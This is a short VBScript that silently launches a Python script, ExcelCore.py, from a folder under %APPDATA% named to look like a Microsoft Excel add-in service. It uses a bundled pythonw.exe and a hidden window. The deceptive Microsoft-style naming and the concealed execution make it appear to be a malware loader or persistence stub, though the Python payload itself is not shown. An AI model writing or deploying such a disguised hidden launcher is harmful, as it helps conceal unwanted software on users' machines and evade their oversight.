Set ws = CreateObject("WScript.Shell")
dest = ws.ExpandEnvironmentStrings("%APPDATA%\Microsoft\AddIns\ExcelCoreService")
ws.Run """" & dest & "\env_312\Scripts\pythonw.exe"" """ & dest & "\ExcelCore.py""", 0, False
